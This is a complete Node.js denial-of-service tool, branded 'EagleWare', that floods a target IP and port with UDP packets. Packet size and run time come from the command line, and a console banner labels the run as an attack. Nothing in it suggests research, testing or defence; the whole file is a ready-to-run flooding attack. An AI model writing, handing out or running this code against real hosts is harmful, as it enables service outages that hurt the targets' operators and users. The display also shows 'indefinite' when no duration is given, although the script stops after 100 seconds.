const dgram = require('dgram');
const process = require('process');

const [,, ip, port, size, duration] = process.argv;

const client = dgram.createSocket('udp6');

const endtime = Date.now() + (duration ? duration * 1000 : 100000);
const packetSize = size ? parseInt(size) : Math.floor(Math.random() * (1500 - 64)) + 64;
const targetPort = port ? parseInt(port) : Math.floor(Math.random() * (65535 - 1)) + 1;

const printAttackDetails = () => {
    console.clear();
    const width = process.stdout.columns || 80; 
    console.log(' '.repeat((width - 30) / 2) + "EagleWare Attack Details");
    console.log(' '.repeat((width - 40) / 2) + "╔════════════════════════════════╗");
    console.log(' '.repeat((width - 40) / 2) + ` Target IP: ${ip}`);
    console.log(' '.repeat((width - 40) / 2) + ` Port: ${targetPort}`);
    console.log(' '.repeat((width - 40) / 2) + ` Packet Size: ${packetSize} bytes`);
    console.log(' '.repeat((width - 40) / 2) + ` Duration: ${duration ? duration + ' seconds' : 'indefinite'}`);
    console.log(' '.repeat((width - 40) / 2) + ` Method: UDP Flood`);
    console.log(' '.repeat((width - 40) / 2) + "╚════════════════════════════════╝");
};

printAttackDetails();

let packetCount = 0;

const sendPackets = () => {
    if (Date.now() > endtime) {
        console.log(`Total packets sent: ${packetCount}`);
        client.close();
        return;
    }

    const message = Buffer.alloc(packetSize, 'flood');
    client.send(message, targetPort, ip, (err) => {
        if (err) {
            console.error('Error sending packet:', err);
            client.close();
        } else {
            packetCount++;
            setImmediate(sendPackets);
        }
    });
};

sendPackets();
